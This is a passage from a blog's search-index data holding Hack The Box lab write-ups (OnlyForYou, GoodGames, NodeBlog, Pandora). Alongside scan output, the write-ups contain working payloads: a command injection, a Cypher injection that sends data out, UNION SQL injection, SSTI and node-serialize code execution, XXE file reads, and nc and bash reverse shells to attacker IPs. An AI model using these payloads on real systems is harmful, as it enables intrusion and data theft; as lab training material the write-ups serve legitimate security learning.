2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/twomillion/images/twomillion.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/twomillion/","summary":"TwoMillion Enumeration ","tags":["HTB"],"title":"[HTB] Machine: TwoMillion"},{"categories":null,"contents":"OnlyForYou Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -p- -Pn 10.10.11.210 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 16:45 BST Nmap scan report for 10.10.11.210 (10.10.11.210) Host is up (0.15s latency). Not shown: 65519 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 1249.23 seconds â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -p22,80 -sC -sV -Pn 10.10.11.210 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 17:08 BST Nmap scan report for 10.10.11.210 (10.10.11.210) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e883e0a9fd43df38198aaa35438411ec (RSA) | 256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA) |_ 256 445f7aa377690a77789b04e09f11db80 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://only4you.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.46 seconds Web Server Found a vhost ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://only4you.htb/' -H 'Host: FUZZ.only4you.htb' gobuster â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ gobuster dir -u http://beta.only4you.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://beta.only4you.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/25 17:33:53 Starting gobuster in directory enumeration mode =============================================================== /download (Status: 405) [Size: 683] /source (Status: 200) [Size: 12127] /list (Status: 200) [Size: 5934] /convert (Status: 200) [Size: 2760] /resize (Status: 200) [Size: 2984] Progress: 20734 / 26585 (77.99%)[ERROR] 2023/05/25 17:38:42 [!] parse \u0026#34;http://beta.only4you.htb/error\\x1f_log\u0026#34;: net/url: invalid control character in URL Progress: 26584 / 26585 (100.00%) =============================================================== 2023/05/25 17:40:03 Finished =============================================================== Foothold If we visit beta.only4you.htb we can download the source code Download it and analyze We have a possbile lfi Testing proves it Let\u0026rsquo;s check if there are other vhosts We have a location of our application in /var/www/only4you.htb/ Open a source file We can use wfuzz or just guess it and tryapp.py wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt -u http://beta.only4you.htb/download -X POST -d \u0026quot;image=/var/www/only4you.htb/FUZZ.FUZ2Z\u0026quot; Let\u0026rsquo;s check form.py since it is included in app.py We have a possible command injection but we need to bypass regex check re.match checks only the start of the string So we can append our command The request Let\u0026rsquo;s append ;curl http://10.10.16.48:8000 or ;ping -c 1 10.10.16.48 to email parameter Start webserver or tcpdump and send request And we have a connection Let\u0026rsquo;s get revshell User Enumerate We have interesting ports 7687, 7474, 8001, 3000 tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8001 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 1049/nginx: worker tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 127.0.0.1:7687 :::* LISTEN - tcp6 0 0 127.0.0.1:7474 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - I uploaded chisel and started remote port forwarding Note: the screenshots only show 7687, 7474 I forgot to take screenshots when I added other ports Port 3000 Gogs Port 8001 Dashboards Trying default creds admin:admin works If we look closely, we see tasks Migrated to new database(neo4j) So we need to play with neo4j Port 7474 neo4j Neo4j is a graph based database It uses Cypher as query language and has a documentation to get familiar with it https://neo4j.com/developer/cypher/querying/ Googling shows that we can try Cypher Injections https://neo4j.com/developer/kb/protecting-against-cypher-injection/ https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#get-labels Dashboards (port 8001) had Employee page If we play around with search, we have our injection By playing around with payloads I eventually managed to get password Note, screen shows only one password (I had to reset the box to get john hash) The following query had better results (props to 0xdf) ' match (u:user) with distinct u.username + \u0026quot;:\u0026quot; + u.password as d LOAD CSV FROM 'http://10.10.16.48/?'+d as a return a // Now we can ssh as john Root Enumerate sudo -l It looks like john can download any repository from Gogs If we try john\u0026rsquo;s creds to login to Gogs, they work Potential privilege escalation is to create a malicious package and download it to execute arbitrary code. https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/ https://medium.com/checkmarx-security/automatic-execution-of-code-upon-package-download-on-python-package-manager-cd6ed9e366a8 https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/ Now we jsut have to follow the steps We need to download https://github.com/wunderwuzzi23/this_is_fine_wuzzi And modify the setup.py and then build it via python3 -m build Create repository and upload tar from dist directory that was created after build Or we can create a repo and publish it as john with tar in it (which is what I did) Now download via sudo My malicious package added suid bit to bash We are root ","date":"August 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/images/onlyforyou.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/","summary":"OnlyForYou Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -p- -Pn 10.10.11.210 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 16:45 BST Nmap scan report for 10.10.11.210 (10.10.11.210) Host is up (0.15s latency). Not shown: 65519 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 1249.23 seconds â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -p22,80 -sC -sV -Pn 10.10.11.210 -T4 Starting Nmap 7.","tags":["HTB","ffuf","vhost","subdomain","flask","source-code","file-read","directory-traversal","python-re","command-injection","chisel","gogs","neo4j","cypher-injection","cypher","crackstation","pip","setup-py"],"title":"[HTB] Machine: OnlyForYou"},{"categories":null,"contents":"GoodGames Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.130 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 19:43 BST Nmap scan report for 10.10.11.130 (10.10.11.130) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 |_http-title: GoodGames | Community and Store |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 Service Info: Host: goodgames.htb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.73 seconds gobuster â””â”€$ gobuster dir -u http://goodgames.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --exclude-length 9265 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://goodgames.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 9265 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/21 19:51:04 Starting gobuster in directory enumeration mode =============================================================== /blog (Status: 200) [Size: 44212] /login (Status: 200) [Size: 9294] /profile (Status: 200) [Size: 9267] /signup (Status: 200) [Size: 33387] /logout (Status: 302) [Size: 208] [--\u0026gt; http://goodgames.htb/] /forgot-password (Status: 200) [Size: 32744] No vhosts were found by ffuf\nWeb server\nFoothold Let\u0026rsquo;s register a user Trying SQLI on request If we click gear icon in admin\u0026rsquo;s profile page we are redirected to http://internal-administration.goodgames.htb/ Let\u0026rsquo;s dump the data from database using SQLI, maybe we get lucky and get password email=' union select 1,2,3,database()-- -\u0026amp;password=test - Current database email=' union select 1,2,3,concat(schema_name,':') from information_schema.schemata-- -\u0026amp;password=test - List databases email=' union select 1,2,3,concat(table_name,':') from information_schema.tables where table_schema='main'-- -\u0026amp;password=test - List tables in main database email=' union select 1,2,3,concat(column_name,':') from information_schema.columns where table_name='user'-- -\u0026amp;password=test - List columns names in user table email=' union select 1,2,3,concat(id,':',name,':',password) from user-- -\u0026amp;password=test - Dump user table admin:2b22337f218b2d82dfc3b6f77e7cb8ec Let\u0026rsquo;s crack it admin:superadministrator Creds work for http://internal-administration.goodgames.htb/ We can change username Since it\u0026rsquo;s a flask application, it could be vulnerable to SSTI Let\u0026rsquo;s try id command to test for rce {{ namespace.__init__.__globals__.os.popen('id').read() }} Let\u0026rsquo;s get reverse shell {{ namespace.__init__.__globals__.os.popen('bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.5/6666 0\u0026gt;\u0026amp;1\u0026quot;').read() }} It looks like a container We can upgrade the shell via: script /dev/null -c bash python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;);' User Enumerate the container root@3a453ab39d3d:/home/augustus# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 5: eth0@if6: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0 valid_lft forever preferred_lft forever I found flag in augustus home directory, yet there is no such user in container root@3a453ab39d3d:/home/augustus# cat /etc/passwd rootâŒ0:0:root:/root:/bin/bash daemonâŒ1:1:daemon:/usr/sbin:/usr/sbin/nologin binâŒ2:2:bin:/bin:/usr/sbin/nologin sysâŒ3:3:sys:/dev:/usr/sbin/nologin syncâŒ4:65534:sync:/bin:/bin/sync gamesâŒ5:60:games:/usr/games:/usr/sbin/nologin manâŒ6:12:man:/var/cache/man:/usr/sbin/nologin lpâŒ7:7:lp:/var/spool/lpd:/usr/sbin/nologin mailâŒ8:8:mail:/var/mail:/usr/sbin/nologin newsâŒ9:9:news:/var/spool/news:/usr/sbin/nologin uucpâŒ10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxyâŒ13:13:proxy:/bin:/usr/sbin/nologin www-dataâŒ33:33:www-data:/var/www:/usr/sbin/nologin backupâŒ34:34:backup:/var/backups:/usr/sbin/nologin listâŒ38:38:Mailing List Manager:/var/list:/usr/sbin/nologin ircâŒ39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnatsâŒ41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobodyâŒ65534:65534:nobody:/nonexistent:/usr/sbin/nologin _aptâŒ100:65534::/nonexistent:/bin/false It could be that the directory is mounted root@3a453ab39d3d:/home/augustus# mount ... /dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro) ... We can try to guess and ping 172.19.0.1 to see if it\u0026rsquo;s reachable or for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done; root@3a453ab39d3d:/home/augustus# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done; 64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.111 ms 64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.044 ms Now let\u0026rsquo;s port scan for i in {1..65535}; do echo \u0026gt; /dev/tcp/172.19.0.1/$i \u0026amp;\u0026amp; echo \u0026quot;$i open\u0026quot;; done 2\u0026gt;/dev/null root@3a453ab39d3d:/home/augustus# for i in {1..65535}; do echo \u0026gt; /dev/tcp/172.19.0.1/$i \u0026amp;\u0026amp; echo \u0026#34;$i open\u0026#34;; done 2\u0026gt;/dev/null 22 open 80 open Root During the enumeration I found nothing except the fact that I can create files in augustus directory from both container and host Moreover the permissions are set root when files are created from container So we can copy bash binary and try to set suid bit from container ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/goodgames/images/goodgames.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/goodgames/","summary":"GoodGames Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.130 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 19:43 BST Nmap scan report for 10.10.11.130 (10.10.11.130) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 |_http-title: GoodGames | Community and Store |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 Service Info: Host: goodgames.htb Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","vhosts","sqli","sqli-bypass","sqli-union","ssti","docker escape","docker-mount"],"title":"[HTB] Machine: GoodGames"},{"categories":null,"contents":"NodeBlog Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -p- -Pn 10.10.11.139 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:10 BST Nmap scan report for 10.10.11.139 (10.10.11.139) Host is up (0.20s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp â””â”€$ nmap -p22,5000 -sC -sV -Pn 10.10.11.139 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:30 BST Nmap scan report for 10.10.11.139 (10.10.11.139) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 5000/tcp open http Node.js (Express middleware) |_http-title: Blog Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds Web Server gobuster â””â”€$ gobuster dir -u http://10.10.11.139:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.139:5000 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/23 20:32:12 Starting gobuster in directory enumeration mode =============================================================== /login (Status: 200) [Size: 1002] /Login (Status: 200) [Size: 1002] Foothold/User We see the login page Let\u0026rsquo;s play with it Trying SQLI had no result So let\u0026rsquo;s also try NoSQLI If we test for json version of Authentication Bypass in NoSQLI we have a hit We need to change Content-Type to applicaiton/json And used the payload: {\u0026quot;user\u0026quot;: {\u0026quot;$ne\u0026quot;: null}, \u0026quot;password\u0026quot;: {\u0026quot;$ne\u0026quot;: null}} We can either intercept and change the headers Or send the request to Repeater, get auth cookie and set it in the browser to continue There\u0026rsquo;s an Upload option, if we click it and select any file, it returns error with a path /articles/xml Browser treats tags as HTML Create a test xml file and upload it \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;TEST\u0026lt;/title\u0026gt; \u0026lt;description\u0026gt;TEST\u0026lt;/description\u0026gt; \u0026lt;markdown\u0026gt; ## TEST Test \u0026lt;/markdown\u0026gt; \u0026lt;/post\u0026gt; And it works Let;s try XXE We can test the payloads from PayloadAllTheThings Make sure to craft payload into the format the site expects We can set every field to entity \u0026amp;file and the payload works for all of them \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;\u0026amp;file;\u0026lt;/title\u0026gt; \u0026lt;description\u0026gt;\u0026amp;file;\u0026lt;/description\u0026gt; \u0026lt;markdown\u0026gt; \u0026amp;file; \u0026lt;/markdown\u0026gt; \u0026lt;/post\u0026gt; So I was stuck here for a while, until I made a mistake in json while sending /login info and I got an error message So now we know that the app is running in /opt/blog We need to test for app.js, server.js, main.js (Basic files for frameworks) Let\u0026rsquo;s analyze it const express = require(\u0026amp;#39;express\u0026amp;#39;) const mongoose = require(\u0026amp;#39;mongoose\u0026amp;#39;) const Article = require(\u0026amp;#39;./models/article\u0026amp;#39;) const articleRouter = require(\u0026amp;#39;./routes/articles\u0026amp;#39;) const loginRouter = require(\u0026amp;#39;./routes/login\u0026amp;#39;) const serialize = require(\u0026amp;#39;node-serialize\u0026amp;#39;) const methodOverride = require(\u0026amp;#39;method-override\u0026amp;#39;) const fileUpload = require(\u0026amp;#39;express-fileupload\u0026amp;#39;) const cookieParser = require(\u0026amp;#39;cookie-parser\u0026amp;#39;); const crypto = require(\u0026amp;#39;crypto\u0026amp;#39;) const cookie_secret = \u0026amp;#34;UHC-SecretCookie\u0026amp;#34; //var session = require(\u0026amp;#39;express-session\u0026amp;#39;); const app = express() mongoose.connect(\u0026amp;#39;mongodb://localhost/blog\u0026amp;#39;) app.set(\u0026amp;#39;view engine\u0026amp;#39;, \u0026amp;#39;ejs\u0026amp;#39;) app.use(express.urlencoded({ extended: false })) app.use(methodOverride(\u0026amp;#39;_method\u0026amp;#39;)) app.use(fileUpload()) app.use(express.json()); app.use(cookieParser()); //app.use(session({secret: \u0026amp;#34;UHC-SecretKey-123\u0026amp;#34;})); function authenticated(c) { if (typeof c == \u0026amp;#39;undefined\u0026amp;#39;) return false c = serialize.unserialize(c) if (c.sign == (crypto.createHash(\u0026amp;#39;md5\u0026amp;#39;).update(cookie_secret + c.user).digest(\u0026amp;#39;hex\u0026amp;#39;)) ){ return true } else { return false } } app.get(\u0026amp;#39;/\u0026amp;#39;, async (req, res) =\u0026amp;gt; { const articles = await Article.find().sort({ createdAt: \u0026amp;#39;desc\u0026amp;#39; }) res.render(\u0026amp;#39;articles/index\u0026amp;#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) }) }) app.use(\u0026amp;#39;/articles\u0026amp;#39;, articleRouter) app.use(\u0026amp;#39;/login\u0026amp;#39;, loginRouter) app.listen(5000) So the node-serialize looks interesting, since improper deserialization could lead to bad things https://portswigger.net/web-security/deserialization And we have a payload We know that our cookie is a url-encoded json Let\u0026rsquo;s try it {\u0026quot;rce\u0026quot;:\u0026quot;_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.16.5', function(error,stdout, stderr) { console.log(stdout) });}()\u0026quot;} Encode as url and send it Since we got rce, let\u0026rsquo;s get a shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.5 6666 \u0026gt;/tmp/f By the way, there was another trick to get a shell We encode revshell payload as base64 echo 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.5/6666 0\u0026gt;\u0026amp;1' | base64 And in the payload itself add it as: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzY2NjYgMD4mMQo= | base64 -d| bash I couldn\u0026rsquo;t read the user flag from /home/admin since it didnt have x permissions set But admin is the owner of the folder, we can set permissions run chmod +x /home/admin and get the flag Root Enumerate We don\u0026rsquo;t have password to check sudo rights No groups We have mongodb running on port 27017 Let\u0026rsquo;s enumerate it admin:IppsecSaysPleaseSubscribe Another way to do it is by using mongodump and bsondump sudo ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nodeblog/images/nodeblog.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nodeblog/","summary":"NodeBlog Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -p- -Pn 10.10.11.139 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:10 BST Nmap scan report for 10.10.11.139 (10.10.11.139) Host is up (0.20s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp â””â”€$ nmap -p22,5000 -sC -sV -Pn 10.10.11.139 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:30 BST Nmap scan report for 10.10.11.139 (10.","tags":["HTB","nodejs","nosql-injection","payloadsallthethings","xxe","node-serialize","deserialization","json-deserialization","mongo","mongodump","bsondump"],"title":"[HTB] Machine: NodeBlog"},{"categories":null,"contents":"Pandora Enumeration nmap â””â”€$ nmap -sV -sC -Pn 10.10.11.136 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 19:34 BST Warning: 10.10.11.136 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.136 (10.10.11.136) Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing 1503/tcp filtered imtc-mcs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.99 seconds â””â”€$ sudo nmap -sU 10.10.11.136 -T4 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 19:38 BST Warning: 10.10.11.136 giving up on port because retransmission cap hit (6). Stats: 0:02:58 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 20.77% done; ETC: 19:52 (0:11:15 remaining) Nmap scan report for 10.10.11.136 (10.10.11.136) Host is up (0.15s latency). Not shown: 984 closed udp ports (port-unreach) PORT STATE SERVICE 17/udp open|filtered qotd 161/udp open snmp 162/udp open|filtered snmptrap 682/udp open|filtered xfr 1013/udp open|filtered unknown 1031/udp open|filtered iad2 19140/udp open|filtered unknown 19222/udp open|filtered unknown 20154/udp open|filtered unknown 21298/udp open|filtered unknown 29823/udp open|filtered unknown 30263/udp open|filtered unknown 32768/udp open|filtered omad 40019/udp open|filtered unknown 49503/udp open|filtered unknown 55043/udp open|filtered unknown Web server gobuster â””â”€$ gobuster dir -u http://panda.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://panda.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/22 19:58:05 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 274] /assets (Status: 301) [Size: 307] [--\u0026gt; http://panda.htb/assets/] /.php (Status: 403) [Size: 274] /server-status (Status: 403) [Size: 274] ffuf â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://panda.htb/\u0026#39; -H \u0026#39;Host: FUZZ.panda.htb\u0026#39; -fs 33560 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://panda.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.panda.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 33560 ________________________________________________ :: Progress: [19966/19966] :: Job [1/1] :: 120 req/sec :: Duration: [0:03:08] :: Errors: 0 :: snmpwalk apt install snmp-mibs-downloader comment line in /etc/snmp/snmp.conf snmpbulkwalk â””â”€$ snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 \u0026gt; snmpbulkwalk.out Foothold/User #1 If we scroll through results, we can see the creds for daniel daniel:HotelBabylon23 ssh to host User #2 Enumerate host We have another user matt He owns /var/www/pandora folder daniel@pandora:/home$ ls -lha /var/www/pandora/pandora_console/ total 1.6M drwxr-xr-x 16 matt matt 4.0K Dec 7 2021 . drwxr-xr-x 3 matt matt 4.0K Dec 7 2021 .. -rw-r--r-- 1 matt matt 3.7K Jan 3 2020 ajax.php drwxr-xr-x 6 matt matt 4.0K Dec 7 2021 attachment -rw-r--r-- 1 matt matt 1.2K Jun 17 2021 audit.log -rw-r--r-- 1 matt matt 534 Jan 3 2020 AUTHORS -rw-r--r-- 1 matt matt 585 Jan 3 2020 composer.json -rw-r--r-- 1 matt matt 16K Jan 3 2020 composer.lock -rw-r--r-- 1 matt matt 15K May 17 2019 COPYING -rw-r--r-- 1 matt matt 506 Jan 3 2020 DB_Dockerfile drwxr-xr-x 2 matt matt 4.0K Dec 7 2021 DEBIAN -rw-r--r-- 1 matt matt 3.3K Jan 3 2020 docker_entrypoint.sh -rw-r--r-- 1 matt matt 1.3K Jan 3 2020 Dockerfile drwxr-xr-x 11 matt matt 4.0K Dec 7 2021 extensions drwxr-xr-x 4 matt matt 4.0K Dec 7 2021 extras drwxr-xr-x 2 matt matt 4.0K Dec 7 2021 fonts drwxr-xr-x 5 matt matt 4.0K Dec 7 2021 general drwxr-xr-x 20 matt matt 4.0K Dec 7 2021 godmode drwxr-xr-x 21 matt matt 36K Dec 7 2021 images drwxr-xr-x 21 matt matt 4.0K Dec 7 2021 include -rw-r--r-- 1 matt matt 52K Dec 2 2021 index.php -rw-r--r-- 1 matt matt 42K Jan 3 2020 install.done drwxr-xr-x 5 matt matt 4.0K Dec 7 2021 mobile drwxr-xr-x 15 matt matt 4.0K Dec 7 2021 operation -rw-r--r-- 1 matt matt 1.3K Aug 22 18:26 pandora_console.log -rw-r--r-- 1 matt matt 234 May 17 2019 pandora_console_logrotate_centos -rw-r--r-- 1 matt matt 171 May 17 2019 pandora_console_logrotate_suse -rw-r--r-- 1 matt matt 222 May 17 2019 pandora_console_logrotate_ubuntu -rw-r--r-- 1 matt matt 4.8K May 17 2019 pandora_console_upgrade -rw-r--r-- 1 matt matt 1.2M Jan 3 2020 pandoradb_data.sql -rw-r--r-- 1 matt matt 157K Jan 3 2020 pandoradb.sql -rw-r--r-- 1 matt matt 476 Jan 3 2020 pandora_websocket_engine.service drwxr-xr-x 3 matt matt 4.0K Dec 7 2021 tests drwxr-xr-x 2 matt matt 4.0K Dec 7 2021 tools drwxr-xr-x 11 matt matt 4.0K Dec 7 2021 vendor -rw-r--r-- 1 matt matt 4.8K Jan 3 2020 ws.php But we can\u0026rsquo;t read config.php daniel@pandora:/home$ cat /var/www/pandora/pandora_console/include/config.php cat: /var/www/pandora/pandora_console/include/config.php: Permission denied daniel@pandora:/home$ ls -lha /var/www/pandora/pandora_console/include/config.php -rw------- 1 matt matt 413 Dec 3 2021 /var/www/pandora/pandora_console/include/config.php We have found vhost related to /var/www/pandora daniel@pandora:/home$ ls -lha /etc/apache2/sites-enabled/ total 8.0K drwxr-xr-x 2 root root 4.0K Dec 3 2021 . drwxr-xr-x 8 root root 4.0K Dec 7 2021 .. lrwxrwxrwx 1 root root 35 Dec 3 2021 000-default.conf -\u0026gt; ../sites-available/000-default.conf lrwxrwxrwx 1 root root 31 Dec 3 2021 pandora.conf -\u0026gt; ../sites-available/pandora.conf daniel@pandora:/home$ cat 